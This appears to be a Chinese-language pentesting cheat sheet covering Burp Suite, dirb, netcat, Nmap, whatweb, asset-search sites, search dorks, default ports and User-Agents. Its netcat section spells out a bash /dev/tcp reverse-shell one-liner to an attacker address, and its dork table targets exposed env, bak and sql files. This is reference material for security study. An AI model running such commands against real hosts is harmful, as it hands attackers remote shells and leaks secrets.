# 指令

# 软件

## Burp Suite

### 安装证书

启动Burp Suite代理服务器，然后打开`http://burp`，从网页下载CA Certificate

- dirb - 目录扫描

简单的目录扫描工具。能实现类似功能的还有dirbuster（GUI）和ffuf（模糊测试）等

```shell
dirb "example.com"  "/usr/share/dirb/wordlists/big.txt" -o "output.txt"
```

| 参数 | 作用                |
| ---- | ------------------- |
| `-a` | User-Agent          |
| `-X` | eXtension，如`.php` |
| `-z` | 延迟（毫秒）        |
| `-H` | 请求头，            |

## ffuf - 模糊测试

```shell
ffuf -v
```

## Metasploit Framework

`msfconsole`

## netcat

简称nc，有建立、监听TCP/UDP连接的功能，可用于简单通信、发送任意数据包。在渗透测试中还常用作反弹shell

**基本操作**

```shell
# 监听端口（服务端）
nc -l -p 80
nc -l -p 80 < index.html  # 监听80端口，建立连接后发送index.html

# 连接主机（客户端）
nc example.com 80
nc example.com 80 > index.html  # 连接主机的80端口，建立连接后将受到数据保存为index.html
```

**反向连接**

1. 攻击者在自己的机器上监听某个端口：`nc -l -p 4444`
2. 目标主机运行这段指令。具体含义是：`bash -i`以交互模式启动bash；重定向符`>&`将`stdout, stderr`输出到下一个参数；`dev/tcp/addr/port`是与该地址建立TCP连接，并视作伪设备文件；`0>&1`表示将`stdin`重定向到`stdout`

```bash
bash -i >& "/dev/tcp/$attacker_addr/4444" 0>&1
```

3. 建立连接后，目标主机将自己的 Shell 输入输出通过该连接传输，攻击者即可操作目标命令行



## Nmap - 端口扫描

Nmap（Network Mapper）是快速的网络扫描工具。它可以用作主机发现、端口扫描、服务识别、操作系统识别工具

参数：`nmap 选项 目标`。[官方文档](https://nmap.org/man/zh/index.html)

```shell
$target = "example.com"
nmap -sn $target      # 主机发现
nmap -Pn -sS $target  # 扫描开放端口
nmap -Pn -sS -sV $target -p 443  # 识别端口的服务
```

### 基础用法

```shell
# 指定目标
nmap "example.com"      # 域名
nmap "192.168.0.1"      # IP地址
nmap "example.com/24"   # IP段
nmap "192.168.0.1-254"  # IP范围

# 指定端口。不指定的时候扫1000个常用端口
nmap "example.com" -p "21,443"
nmap "example.com" -p "1-65535"  # 全端口扫描
nmap "example.com" -F            # 快速扫描，只扫100个最常用的端口

# 其他
nmap --script="script.lua"  # 脚本扫描
nmap -v "example.com"       # verbose。还有-vv, -vvv，更详细；类似的还有调试级别d
nmap -T4 "example.com"      # 时间间隔控制，T1~T5。默认T3，快速扫描一般用T4
```

**扫描选项**

1. Ping扫描（主机发现，确认主机存活）
    - `-sL`：列表主机发现。不发送报文，仅通过反向域名解析发现主机
    - `-sn`：无端口扫描（no port scan），也叫Ping扫描，扫完不继续进行端口扫描
    - `-Pn`：无Ping扫描（no ping scan），跳过Ping扫描
2. 端口扫描（寻找开放端口）
    - `-sS`：SYN半连接扫描。只发SYN，不回复ACK。速度快，隐蔽性高；需要管理员权限
    - `-sT`：TCP连接扫描。尝试完成TCP握手。速度慢，易被目标日志记录；结果更准确
    - `-sU`：UDP扫描
    - 其他：主要用来绕过防火墙、探测防火墙规则
3. 特征扫描（发送报文，根据服务器返回报文的特征推断服务器信息）
    - `-sV`：服务探测。识别端口对应的服务名、版本号
    - `-O`：操作系统探测。识别目标的操作系统

**输出选项**：使用以下选项后，nmap将结果以指定格式写入文件（不改变stdout打印的结果）

```shell
nmap -oN "scan.nmap" "example.com"  # 标准输出
nmap -oX "scan.xml" "example.com"   # XML输出

nmap --resume "scan.nmap"  # 恢复中断的扫描。不能使用其他参数，不支持XML日志
```

TCP握手复习：客户端发送SYN包，服务器返回SYN-ACK包，客户端回复ACK包。中途任意一方连接出错，就发RST包中断连接

- open：端口开启。即有应用程序在监听该端口，服务器发回SYN-ACK报文
- closed：端口关闭。即没有应用程序监听该端口，服务器发回RST报文
- filtered：被防火墙等安全措施阻挡，无法判断端口是否开启。即服务器没有发回报文
- unfiltered：未被阻挡，且无法判断端口是否开启。进行`-sA`扫描时服务器发回RST报文

### 隐蔽选项



## sqlmap - SQL注入工具

## watweb - 指纹识别

```shell
whatweb -v --log-xml=log.xml "example.com"

whatweb -p md5 "example.com"  # 插件
```



# 在线工具

## 测绘工具

- [FOFA](https://fofa.info/)
- [Shodan](https://www.shodan.io/)（[语法参考](https://help.shodan.io/the-basics/search-query-fundamentals)）
- [钟馗之眼](https://www.zoomeye.org/)
- [鹰图平台](https://hunter.qianxin.com/)
- https://quake.360.net/quake/#/index
- https://x.threatbook.cn

## 搜索引擎

| Operator   | 含义               | 示例                    | 备注/可尝试的关键词          |
| ---------- | ------------------ | ----------------------- | ---------------------------- |
| `site`     | 指定网站           | `insite:example.com`    |                              |
| `inurl`    | URL中包含指定词    | `inurl:id=`             | `id=, file=`                 |
| `intitle`  | 网页标题包含指定词 | `intitle:"index of"`    | `phpinfo, index of`          |
| `intext`   | 网页内容包含指定词 | `intext:"@gmail.com"`   |                              |
| `filetype` | 文件类型           | `filetype:cfg`          | `env, bak, sql, zip, tar.gz` |
| `link`     | 链接到指定页面     | `link:example.com/news` | 最好单独使用                 |

## 其他

[hash反向查询](https://www.cmd5.com)

# 常用信息

## 常见默认端口

| 端口  | 常见服务      | 备注           |
| ----- | ------------- | -------------- |
| 21    | FTP           |                |
| 22    | SSH           |                |
| 23    | TELNET        |                |
| 53    | DNS           |                |
| 80    | HTTP          |                |
| 443   | HTTPS         |                |
| 445   | SMB           | 微软的文件共享 |
| 1433  | MSSQL         |                |
| 1521  | Oracle        |                |
| 3306  | MySQL         |                |
| 3389  | RDP           | 远程桌面       |
| 5432  | pgsql         |                |
| 6379  | Redis         |                |
| 8080  | tomcat, jboss |                |
| 27017 | MongoDB       |                |

## User-Agent

格式：`User-Agent: <product> / <product-version> <comment>`；[UA列表](https://gist.github.com/pzb/b4b6f57144aea7827ae4)

```
# Windows
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36

Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)

# 微信浏览器。微信小程序需要在后面加上miniProgram
Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN

# MUMU模拟器微信小程序
Mozilla/5.0 (Linux; Android 12; M2102J2SC Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 MMWEBID/7854 MicroMessenger/8.0.57.2820(0x28003933) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android
```

